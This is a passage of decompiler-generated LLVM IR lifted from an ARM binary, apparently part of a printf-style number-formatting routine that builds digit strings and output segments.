  %v2_13a8c = xor i1 %v8_13a80, %v7_13a80
  br i1 %v2_13a8c, label %dec_label_pc_13ad8, label %dec_label_pc_13a90

dec_label_pc_13a90:                               ; preds = %dec_label_pc_13a7c
  store i32 %v2_13a80, i32* %r2.global-to-local, align 4
  %v2_13a94 = icmp eq i32 %v2_13a80, 0
  store i1 %v2_13a94, i1* %cpsr_z.global-to-local, align 1
  %v2_13a98 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_13a98, i32* %lr.global-to-local, align 4
  %tmp237 = icmp slt i32 %v2_13a80, 1
  br i1 %tmp237, label %.thread145, label %dec_label_pc_13aac

.thread145:                                       ; preds = %dec_label_pc_13a90
  %v7_13aa0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_13aa0, i32* @r7, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a90
  store i32 ptrtoint (i32* @global_var_1a9c3.593 to i32), i32* %r3.global-to-local, align 4
  %v2_13abc = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_13abc, i32* @r7, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_13af8

dec_label_pc_13ad8:                               ; preds = %dec_label_pc_13a7c
  store i1 %v2_13a5c, i1* %cpsr_z.global-to-local, align 1
  %v2_13adc = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_13adc, i32* %lr.global-to-local, align 4
  br i1 %v2_13a5c, label %bb238, label %bb239

bb238:                                            ; preds = %dec_label_pc_13ad8
  %v3_13ae4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_13ae4, i32* @r7, align 4
  br label %.thread34

bb239:                                            ; preds = %dec_label_pc_13ad8
  %v3_13ae8 = sub i32 %v2_13a70, %v1_13ae830
  store i32 %v3_13ae8, i32* %ip.global-to-local, align 4
  %v3_13aec63 = add i32 %v5_13a58, %v1_13ae830
  store i32 %v3_13aec63, i32* %r6.global-to-local, align 4
  %v3_13af0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_13af0, i32* @r7, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread145, %bb238, %bb239
  %v1_13b38261 = phi i32 [ %v3_13ae4, %bb238 ], [ %v3_13af0, %bb239 ], [ %v7_13aa0, %.thread145 ]
  %v0_13b0c100 = phi i32 [ %v2_13a70, %bb238 ], [ %v3_13ae8, %bb239 ], [ 0, %.thread145 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13af8

dec_label_pc_13af8:                               ; preds = %.thread, %dec_label_pc_13aac, %.thread34
  %v1_13b38 = phi i32 [ %v2_13abc, %dec_label_pc_13aac ], [ %v1_13b38261, %.thread34 ], [ %v5_13a74, %.thread ]
  %v0_13b4c107 = phi i32 [ -1, %dec_label_pc_13aac ], [ -1, %.thread34 ], [ %v1_13ae830, %.thread ]
  %v0_13b0c = phi i32 [ 0, %dec_label_pc_13aac ], [ %v0_13b0c100, %.thread34 ], [ %v2_13a70, %.thread ]
  %v3_13af8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_13af8, i32* %r2.global-to-local, align 4
  %v1_13afc = add i32 %v3_13af8, 12
  %v2_13afc = inttoptr i32 %v1_13afc to i32*
  %v3_13afc = load i32, i32* %v2_13afc, align 4
  %v1_13b00 = and i32 %v3_13afc, 16
  store i32 %v1_13b00, i32* %r4.global-to-local, align 4
  %v2_13b00 = icmp eq i32 %v1_13b00, 0
  %tmp266 = zext i1 %v2_13b00 to i32
  %.255 = xor i32 %tmp266, 1
  store i32 %.255, i32* %r3.global-to-local, align 4
  %v2_13b0c = icmp eq i32 %v0_13b0c, 0
  store i1 %v2_13b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13b0c, label %bb242, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_13af8
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13b28

bb242:                                            ; preds = %dec_label_pc_13af8
  store i1 %v2_13b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13b00, label %dec_label_pc_13b1c, label %dec_label_pc_13b28

dec_label_pc_13b1c:                               ; preds = %bb242
  %v0_13b1c = load i32, i32* %sb.global-to-local, align 4
  %v7_13b1c = icmp eq i32 %v0_13b1c, 103
  store i1 %v7_13b1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13b1c, label %dec_label_pc_13b4c, label %bb243

bb243:                                            ; preds = %dec_label_pc_13b1c
  %v1_13b20 = load i32, i32* %fp.global-to-local, align 4
  %v3_13b20 = icmp eq i32 %v1_13b20, 0
  store i1 %v3_13b20, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v1_13b20, 1
  br i1 %tmp244, label %dec_label_pc_13b4c, label %dec_label_pc_13b28

dec_label_pc_13b28:                               ; preds = %.thread37, %bb242, %bb243
  store i32 add (i32 ptrtoint (i32* @global_var_f4f8.583 to i32), i32 79332), i32* %lr.global-to-local, align 4
  %v2_13b38 = inttoptr i32 %v1_13b38 to i32*
  store i32 112, i32* %v2_13b38, align 4
  store i32 ptrtoint (i32* @global_var_1a9d0.594 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_13b44 = load i32, i32* @r7, align 4
  %v1_13b44 = add i32 %v0_13b44, 4
  %v2_13b44 = inttoptr i32 %v1_13b44 to i32*
  store i32 1, i32* %v2_13b44, align 4
  %v4_13b44 = add i32 %v0_13b44, 8
  %v5_13b44 = inttoptr i32 %v4_13b44 to i32*
  %v6_13b44 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_13b44, i32* %v5_13b44, align 4
  %v0_13b48 = load i32, i32* @r7, align 4
  %v1_13b48 = add i32 %v0_13b48, 12
  store i32 %v1_13b48, i32* @r7, align 4
  %v0_13b4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b4c

dec_label_pc_13b4c:                               ; preds = %dec_label_pc_13b1c, %bb243, %dec_label_pc_13b28
  %v1_13b6c = phi i32 [ %v1_13b38, %bb243 ], [ %v1_13b48, %dec_label_pc_13b28 ], [ %v1_13b38, %dec_label_pc_13b1c ]
  %v0_13b4c = phi i32 [ %v0_13b4c107, %bb243 ], [ %v0_13b4c.pre, %dec_label_pc_13b28 ], [ %v0_13b4c107, %dec_label_pc_13b1c ]
  %v1_13b4c = add i32 %v0_13b4c, 1
  store i32 %v1_13b4c, i32* @lr, align 4
  %v6_13b4c = icmp slt i32 %v1_13b4c, 0
  %v7_13b4c = icmp eq i32 %v1_13b4c, 0
  store i1 %v7_13b4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_13b4c, label %dec_label_pc_13b54, label %dec_label_pc_13b78

dec_label_pc_13b54:                               ; preds = %dec_label_pc_13b4c
  store i32 ptrtoint (i32* @global_var_1a9c3.593 to i32), i32* %r3.global-to-local, align 4
  %v1_13b64 = sub i32 -1, %v0_13b4c
  store i32 %v1_13b64, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_13b6c = inttoptr i32 %v1_13b6c to i32*
  store i32 176, i32* %v2_13b6c, align 4
  %v0_13b70 = load i32, i32* @r7, align 4
  %v1_13b70 = add i32 %v0_13b70, 4
  %v2_13b70 = inttoptr i32 %v1_13b70 to i32*
  %v3_13b70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_13b70, i32* %v2_13b70, align 4
  %v4_13b70 = add i32 %v0_13b70, 8
  %v5_13b70 = inttoptr i32 %v4_13b70 to i32*
  %v6_13b70 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_13b70, i32* %v5_13b70, align 4
  %v0_13b74 = load i32, i32* @r7, align 4
  %v1_13b74 = add i32 %v0_13b74, 12
  store i32 %v1_13b74, i32* @r7, align 4
  br label %dec_label_pc_13b78

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b4c, %dec_label_pc_13b54
  %v2_13b80 = phi i32 [ %v1_13b6c, %dec_label_pc_13b4c ], [ %v1_13b74, %dec_label_pc_13b54 ]
  %v0_13b78 = load i32, i32* %ip.global-to-local, align 4
  %v2_13b78 = icmp eq i32 %v0_13b78, 0
  store i1 %v2_13b78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13b78, label %.thread46, label %bb245

bb245:                                            ; preds = %dec_label_pc_13b78
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_13b80 = inttoptr i32 %v2_13b80 to i32*
  store i32 112, i32* %v3_13b80, align 4
  %v1_13b84 = load i32, i32* %r6.global-to-local, align 4
  %v2_13b84 = load i32, i32* @r7, align 4
  %v3_13b84 = add i32 %v2_13b84, 8
  %v4_13b84 = inttoptr i32 %v3_13b84 to i32*
  store i32 %v1_13b84, i32* %v4_13b84, align 4
  %v1_13b88 = load i32, i32* %ip.global-to-local, align 4
  %v2_13b88 = load i32, i32* @r7, align 4
  %v3_13b88 = add i32 %v2_13b88, 4
  %v4_13b88 = inttoptr i32 %v3_13b88 to i32*
  store i32 %v1_13b88, i32* %v4_13b88, align 4
  %v1_13b8c = load i32, i32* @r7, align 4
  %v2_13b8c = add i32 %v1_13b8c, 12
  store i32 %v2_13b8c, i32* @r7, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_13b78, %bb245
  %v1_13bc4 = phi i32 [ %v2_13b80, %dec_label_pc_13b78 ], [ %v2_13b8c, %bb245 ]
  %v0_13b90 = load i32, i32* %sb.global-to-local, align 4
  %v7_13b90 = icmp eq i32 %v0_13b90, 103
  store i1 %v7_13b90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13b90, label %dec_label_pc_13b98, label %dec_label_pc_13ba0

dec_label_pc_13b98:                               ; preds = %.thread46
  %v0_13b98 = load i32, i32* %r4.global-to-local, align 4
  %v2_13b98 = icmp eq i32 %v0_13b98, 0
  store i1 %v2_13b98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13b98, label %dec_label_pc_13bd0, label %dec_label_pc_13ba0

dec_label_pc_13ba0:                               ; preds = %.thread46, %dec_label_pc_13b98
  %v0_13ba0 = load i32, i32* @lr, align 4
  %v1_13ba0 = load i32, i32* %ip.global-to-local, align 4
  %v2_13ba0 = sub i32 %v1_13ba0, %v0_13ba0
  store i32 %v2_13ba0, i32* %r1.global-to-local, align 4
  %v1_13ba4 = load i32, i32* %fp.global-to-local, align 4
  %v2_13ba4 = sub i32 %v2_13ba0, %v1_13ba4
  %v4_13ba4 = xor i32 %v1_13ba4, %v2_13ba0
  %v5_13ba4 = xor i32 %v2_13ba4, %v2_13ba0
  %v6_13ba4 = and i32 %v5_13ba4, %v4_13ba4
  %v7_13ba4 = icmp slt i32 %v6_13ba4, 0
  %v8_13ba4 = icmp slt i32 %v2_13ba4, 0
  %v9_13ba4 = icmp eq i32 %v2_13ba0, %v1_13ba4
  store i1 %v9_13ba4, i1* %cpsr_z.global-to-local, align 1
  %v2_13ba8 = xor i1 %v8_13ba4, %v7_13ba4
  br i1 %v2_13ba8, label %dec_label_pc_13bac, label %dec_label_pc_13bd0

dec_label_pc_13bac:                               ; preds = %dec_label_pc_13ba0
  %v2_13bb8 = sub i32 %v1_13ba4, %v2_13ba0
  store i32 %v2_13bb8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a9c3.593 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_13bc4 = inttoptr i32 %v1_13bc4 to i32*
  store i32 176, i32* %v2_13bc4, align 4
  %v0_13bc8 = load i32, i32* @r7, align 4
  %v1_13bc8 = add i32 %v0_13bc8, 4
  %v2_13bc8 = inttoptr i32 %v1_13bc8 to i32*
  %v3_13bc8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_13bc8, i32* %v2_13bc8, align 4
  %v4_13bc8 = add i32 %v0_13bc8, 8
  %v5_13bc8 = inttoptr i32 %v4_13bc8 to i32*
  %v6_13bc8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_13bc8, i32* %v5_13bc8, align 4
  %v0_13bcc = load i32, i32* @r7, align 4
  %v1_13bcc = add i32 %v0_13bcc, 12
  store i32 %v1_13bcc, i32* @r7, align 4
  br label %dec_label_pc_13bd0

dec_label_pc_13bd0:                               ; preds = %dec_label_pc_13ba0, %dec_label_pc_13b98, %dec_label_pc_13bac
  %v1_13c64.pre.pre = phi i32 [ %v1_13bc4, %dec_label_pc_13ba0 ], [ %v1_13bc4, %dec_label_pc_13b98 ], [ %v1_13bcc, %dec_label_pc_13bac ]
  %v0_13bd0 = load i32, i32* %r8.global-to-local, align 4
  %v7_13bd0 = icmp eq i32 %v0_13bd0, 102
  store i1 %v7_13bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13bd0, label %dec_label_pc_13c58, label %dec_label_pc_13bd8

dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13bd0
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_13bdc = load i32, i32* %r0.global-to-local, align 4
  %v1_13bdc = icmp slt i32 %v0_13bdc, 0
  %v2_13bdc = icmp eq i32 %v0_13bdc, 0
  store i1 %v2_13bdc, i1* %cpsr_z.global-to-local, align 1
  %v4_13be0 = select i1 %tmp270, i32 %v4_138fc123127, i32 101
  store i32 %v4_13be0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_13bf0 = sub i32 0, %v0_13bdc
  %storemerge155 = select i1 %v1_13bdc, i32 %v4_13bf0, i32 %v0_13bdc
  %tmp267 = ashr i32 %v0_13bdc, 31
  %tmp268 = and i32 %tmp267, 2
  %tmp269 = add nuw nsw i32 %tmp268, 43
  store i32 %storemerge155, i32* %r5.global-to-local, align 4
  store i32 %tmp269, i32* %sl.global-to-local, align 4
  %v2_13bf8 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_13bf8, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13c00

dec_label_pc_13c00:                               ; preds = %dec_label_pc_13c30, %dec_label_pc_13c00, %dec_label_pc_13bd8
  %v0_13c00 = phi i32 [ %storemerge155, %dec_label_pc_13bd8 ], [ %v0_13c1c, %dec_label_pc_13c00 ], [ %v0_13c1c, %dec_label_pc_13c30 ]
  store i32 %v0_13c00, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_13c08 = call i32 @function_cba0(i32 %v0_13c00, i32 10)
  store i32 58, i32* %r3.global-to-local, align 4
  %v0_13c10 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13c10, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v2_13c18 = load i32, i32* %r6.global-to-local, align 4
  %v3_13c18 = add i32 %v2_13c18, -1
  %v4_13c18 = inttoptr i32 %v3_13c18 to i8*
  store i8 58, i8* %v4_13c18, align 1
  %v5_13c18 = load i32, i32* %r6.global-to-local, align 4
  %v6_13c18 = add i32 %v5_13c18, -1
  store i32 %v6_13c18, i32* %r6.global-to-local, align 4
  %v0_13c1c = call i32 @function_ca74()
  store i32 %v0_13c1c, i32* %r0.global-to-local, align 4
  %v0_13c20 = load i32, i32* %r8.global-to-local, align 4
  %v1_13c20 = add i32 %v0_13c20, 1
  store i32 %v1_13c20, i32* %r8.global-to-local, align 4
  %v7_13c24 = icmp eq i32 %v1_13c20, 3
  store i1 %v7_13c24, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_13c1c, i32* %r5.global-to-local, align 4
  br i1 %v7_13c24, label %dec_label_pc_13c00, label %dec_label_pc_13c30

dec_label_pc_13c30:                               ; preds = %dec_label_pc_13c00
  %v2_13c30 = icmp eq i32 %v0_13c1c, 0
  store i1 %v2_13c30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c30, label %dec_label_pc_13c38, label %dec_label_pc_13c00

dec_label_pc_13c38:                               ; preds = %dec_label_pc_13c30
  %v0_13c38 = load i32, i32* %r6.global-to-local, align 4
  %v1_13c38 = add i32 %v0_13c38, -1
  store i32 %v1_13c38, i32* %r3.global-to-local, align 4
  %v0_13c3c = load i32, i32* %sl.global-to-local, align 4
  %v1_13c3c = trunc i32 %v0_13c3c to i8
  %v4_13c3c = inttoptr i32 %v1_13c38 to i8*
  store i8 %v1_13c3c, i8* %v4_13c3c, align 1
  %v0_13c40 = load i32, i32* %r3.global-to-local, align 4
  %v1_13c40 = add i32 %v0_13c40, -1
  store i32 %v1_13c40, i32* %r2.global-to-local, align 4
  %v0_13c44 = load i32, i32* @r4, align 4
  %v1_13c44 = trunc i32 %v0_13c44 to i8
  %v4_13c44 = inttoptr i32 %v1_13c40 to i8*
  store i8 %v1_13c44, i8* %v4_13c44, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_13c4c = load i32, i32* @r7, align 4
  %v1_13c4c = inttoptr i32 %v0_13c4c to i32*
  store i32 112, i32* %v1_13c4c, align 4
  %v3_13c4c = add i32 %v0_13c4c, 4
  %v4_13c4c = inttoptr i32 %v3_13c4c to i32*
  %v5_13c4c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_13c4c, i32* %v4_13c4c, align 4
  %v0_13c50 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c50 = load i32, i32* @r7, align 4
  %v2_13c50 = add i32 %v1_13c50, 8
  %v3_13c50 = inttoptr i32 %v2_13c50 to i32*
  store i32 %v0_13c50, i32* %v3_13c50, align 4
  %v0_13c54 = load i32, i32* @r7, align 4
  %v1_13c54 = add i32 %v0_13c54, 12
  store i32 %v1_13c54, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13c58

dec_label_pc_13c58:                               ; preds = %dec_label_pc_13bd0, %.thread121, %dec_label_pc_13c38
  %v1_13c64.pre = phi i32 [ %v2_13730, %.thread121 ], [ %v1_13c54, %dec_label_pc_13c38 ], [ %v1_13c64.pre.pre, %dec_label_pc_13bd0 ]
  %v2_13c58 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_13c58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c5c

dec_label_pc_13c5c:                               ; preds = %dec_label_pc_13c5c, %dec_label_pc_13c58
  %v0_13c5c = phi i32 [ %v2_13c58, %dec_label_pc_13c58 ], [ %v4_13c5c, %dec_label_pc_13c5c ]
  %stack_var_-188.0 = phi i32 [ %v3_135cc, %dec_label_pc_13c58 ], [ %v2_13c68, %dec_label_pc_13c5c ]
  %v1_13c5c = inttoptr i32 %v0_13c5c to i32*
  %v2_13c5c = load i32, i32* %v1_13c5c, align 4
  store i32 %v2_13c5c, i32* %r3.global-to-local, align 4
  %v4_13c5c = add i32 %v0_13c5c, 12
  store i32 %v4_13c5c, i32* %r2.global-to-local, align 4
  %v3_13c64 = icmp ult i32 %v4_13c5c, %v1_13c64.pre
  %v2_13c68 = sub i32 %stack_var_-188.0, %v2_13c5c
  store i32 %v2_13c68, i32* %ip.global-to-local, align 4
  br i1 %v3_13c64, label %dec_label_pc_13c5c, label %dec_label_pc_13c74

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13c5c
  %v3_13c74 = load i8, i8* %stack_var_-46, align 1
  %v4_13c74 = sext i8 %v3_13c74 to i32
  store i32 %v4_13c74, i32* %r3.global-to-local, align 4
  store i32 %v4_13c74, i32* %r2.global-to-local, align 4
  %v2_13c78 = icmp eq i8 %v3_13c74, 0
  store i1 %v2_13c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c78, label %bb250, label %bb249

bb249:                                            ; preds = %dec_label_pc_13c74
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb250

bb250:                                            ; preds = %dec_label_pc_13c74, %bb249
  %v1_13cd8 = phi i32 [ %v4_13c74, %dec_label_pc_13c74 ], [ 1, %bb249 ]
  %v2_13c80 = sub i32 %v2_13c68, %v1_13cd8
  store i32 %v2_13c80, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_13c88 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_13c88, i32* %r3.global-to-local, align 4
  %v2_13c8c = icmp eq i32 %v2_13c80, 0
  store i1 %v2_13c8c, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp251 = icmp slt i32 %v2_13c80, 1
  br i1 %tmp251, label %dec_label_pc_13cf4, label %dec_label_pc_13ca0

dec_label_pc_13ca0:                               ; preds = %bb250
  %v3_13ca0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_13ca0, i32* %lr.global-to-local, align 4
  %v1_13ca4 = add i32 %v3_13ca0, 12
  %v2_13ca4 = inttoptr i32 %v1_13ca4 to i32*
  %v3_13ca4 = load i32, i32* %v2_13ca4, align 4
  store i32 %v3_13ca4, i32* %r3.global-to-local, align 4
  %v1_13ca8 = and i32 %v3_13ca4, 8
  %v2_13ca8 = icmp eq i32 %v1_13ca8, 0
  store i1 %v2_13ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ca8, label %dec_label_pc_13ccc, label %dec_label_pc_13cb0

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13ca0
  store i32 add (i32 ptrtoint (i32* @global_var_f4f8.583 to i32), i32 79332), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a9c3.593 to i32), i32* %r3.global-to-local, align 4
  %v1_13cc0 = add i32 %v1_13c64.pre, 12
  store i32 %v1_13cc0, i32* %r6.global-to-local, align 4
  %v1_13cc4 = inttoptr i32 %v1_13c64.pre to i32*
  store i32 160, i32* %v1_13cc4, align 4
  %v3_13cc4 = add i32 %v1_13c64.pre, 4
  %v4_13cc4 = inttoptr i32 %v3_13cc4 to i32*
  %v5_13cc4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13cc4, i32* %v4_13cc4, align 4
  %v6_13cc4 = add i32 %v1_13c64.pre, 8
  %v7_13cc4 = inttoptr i32 %v6_13cc4 to i32*
  %v8_13cc4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_13cc4, i32* %v7_13cc4, align 4
  br label %dec_label_pc_13cf8

dec_label_pc_13ccc:                               ; preds = %dec_label_pc_13ca0
  store i32 %v3_13ca0, i32* %ip.global-to-local, align 4
  %v1_13cd0 = add i32 %v3_13ca0, 16
  %v2_13cd0 = inttoptr i32 %v1_13cd0 to i32*
  %v3_13cd0 = load i32, i32* %v2_13cd0, align 4
  store i32 %v3_13cd0, i32* %r3.global-to-local, align 4
  %v7_13cd4 = icmp eq i32 %v3_13cd0, 48
  store i1 %v7_13cd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13cd4, label %.thread54.thread70, label %bb252

bb252:                                            ; preds = %dec_label_pc_13ccc
  store i32 %v2_13c68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13cf4

.thread54.thread70:                               ; preds = %dec_label_pc_13ccc
  %v4_13ce0 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_13c64.pre, i32* %r6.global-to-local, align 4
  %v3_13ce8 = add i32 %v4_13ce0, %v2_13c80
  store i32 %v3_13ce8, i32* %r3.global-to-local, align 4
  store i32 %v3_13ce8, i32* %stack_var_-164, align 4
  br label %dec_label_pc_13cf8

dec_label_pc_13cf4:                               ; preds = %bb252, %bb250
  store i32 %v1_13c64.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13cf8

dec_label_pc_13cf8:                               ; preds = %.thread54.thread70, %dec_label_pc_13cb0, %dec_label_pc_13cf4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_13cfc = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_13cfc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13d00

dec_label_pc_13d00:                               ; preds = %dec_label_pc_13d28, %dec_label_pc_13cf8
  %v0_13d00 = phi i32 [ %v1_13d1c, %dec_label_pc_13d28 ], [ %v2_13cfc, %dec_label_pc_13cf8 ]
  %v1_13d00 = inttoptr i32 %v0_13d00 to i32*
  %v2_13d00 = load i32, i32* %v1_13d00, align 4
  store i32 %v2_13d00, i32* %r1.global-to-local, align 4
  %v3_13d00 = add i32 %v0_13d00, 4
  %v4_13d00 = inttoptr i32 %v3_13d00 to i32*
  %v5_13d00 = load i32, i32* %v4_13d00, align 4
  store i32 %v5_13d00, i32* %r2.global-to-local, align 4
  %v6_13d00 = add i32 %v0_13d00, 8
  %v7_13d00 = inttoptr i32 %v6_13d00 to i32*
  %v8_13d00 = load i32, i32* %v7_13d00, align 4
  store i32 %v8_13d00, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 81172, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_13d14 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d14 = add i32 %v0_13d14, 4
  %v2_13d14 = inttoptr i32 %v1_13d14 to i32*
  %v3_13d14 = load i32, i32* %v2_13d14, align 4
  store i32 %v3_13d14, i32* %r3.global-to-local, align 4
  %v0_13d18 = load i32, i32* %r0.global-to-local, align 4
  %v9_13d18 = icmp eq i32 %v0_13d18, %v3_13d14
  store i1 %v9_13d18, i1* %cpsr_z.global-to-local, align 1
  %v1_13d1c = add i32 %v0_13d14, 12
  store i32 %v1_13d1c, i32* %r5.global-to-local, align 4
  br i1 %v9_13d18, label %dec_label_pc_13d28, label %bb253

bb253:                                            ; preds = %dec_label_pc_13d00
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13d48

dec_label_pc_13d28:                               ; preds = %dec_label_pc_13d00
  %v0_13d2c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_13d28 = load i32, i32* %r6.global-to-local, align 4
  %v3_13d28 = icmp ult i32 %v1_13d1c, %v1_13d28
  %v9_13d28 = icmp eq i32 %v1_13d1c, %v1_13d28
  store i1 %v9_13d28, i1* %cpsr_z.global-to-local, align 1
  %v2_13d2c = add i32 %v0_13d2c.pre, %v3_13d14
  store i32 %v2_13d2c, i32* %r7.global-to-local, align 4
  br i1 %v3_13d28, label %dec_label_pc_13d00, label %dec_label_pc_13d48

dec_label_pc_13d40:                               ; preds = %.thread21, %bb235
  %v0_13d40 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13d40, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13a40

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d28, %bb253
  %v0_13d48 = phi i32 [ -1, %bb253 ], [ %v2_13d2c, %dec_label_pc_13d28 ]
  store i32 %v0_13d48, i32* %r0.global-to-local, align 4
  store i32 %v3_13584, i32* %r4.global-to-local, align 4
  store i32 %v6_13584, i32* @r5, align 4
  store i32 %v9_13584, i32* @r6, align 4
  store i32 %v12_13584, i32* @r7, align 4
  store i32 %v27_13584, i32* @lr, align 4
  ret i32 %v0_13d48

; uselistorder directives
  uselistorder i32 %v0_13d48, { 1, 0 }
  uselistorder i32 %v1_13d28, { 1, 0 }
  uselistorder i32 %v1_13d1c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13d00, { 2, 1, 0 }
  uselistorder i32 %v3_13ca0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_13c68, { 0, 1, 3, 2 }
  uselistorder i32 %v4_13c5c, { 1, 2, 0 }
  uselistorder i32 %v0_13c5c, { 1, 0 }
  uselistorder i32 %v1_13c64.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_13c1c, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_13c00, { 1, 0 }
  uselistorder i32 %storemerge155, { 1, 0 }
  uselistorder i32 %v0_13bdc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_13ba4, { 1, 0 }
  uselistorder i32 %v1_13ba4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13ba0, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_13b00, { 2, 1, 0 }
  uselistorder i32 %v2_13a80, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_13a70, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_13a5c, { 1, 0, 2 }
  uselistorder i32 %v5_13a58, { 0, 2, 1, 3 }
  uselistorder i32 %v1_13ae830, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_13a10, { 1, 0 }
  uselistorder i32 %v1_13a08, { 1, 2, 0 }
  uselistorder i32 %v2_139fc, { 1, 0 }
  uselistorder i32 %v1_139fc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_139fc, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_139cc, { 1, 0 }
  uselistorder i32 %v0_139cc, { 0, 2, 1 }
  uselistorder i32 %v2_139c8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_139b4, { 1, 0 }
  uselistorder i1 %v2_139a4, { 1, 0 }
  uselistorder i32 %v1_139a0, { 3, 2, 1, 0 }
  uselistorder i32 %v2_1399c, { 1, 0 }
  uselistorder i1 %v2_1398c, { 1, 0 }
  uselistorder i32 %v1_13980, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_13934, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13934, { 1, 0, 2 }
  uselistorder i1 %v2_1391c, { 1, 0 }
  uselistorder i32 %v5_13904, { 1, 0 }
  uselistorder i32 %v0_138f0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_138d4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_138b0, { 1, 0 }
